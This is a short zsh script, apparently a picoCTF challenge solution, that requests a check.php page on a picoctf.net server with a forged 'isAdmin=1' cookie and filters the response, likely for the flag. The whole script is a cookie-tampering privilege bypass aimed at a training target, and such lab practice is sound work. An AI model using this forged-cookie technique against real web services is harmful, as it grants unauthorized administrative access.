#!/bin/zsh
source ~/.zshrc
curl -s http://saturn.picoctf.net:61304/check.php --cookie isAdmin=1 | picogrep
